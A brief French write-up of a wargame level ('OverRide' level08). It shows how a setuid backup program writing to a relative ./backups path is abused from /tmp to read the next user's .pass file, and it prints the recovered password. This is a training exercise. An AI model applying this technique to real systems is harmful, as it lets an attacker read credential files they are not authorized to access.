## Le programme
Le programme lit le fichier qu'on lui passe et met le contenu dans ./backups/{filename}
On ne peut pas modifier ~level08/backups, donc si on essaie de lire le .pass du level09 on a une erreur.

Pour contrecarrer ca, on creee l'arborescence de fichier dans /tmp et on execute ~/level08 a partir de /tmp

## La faille

```
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```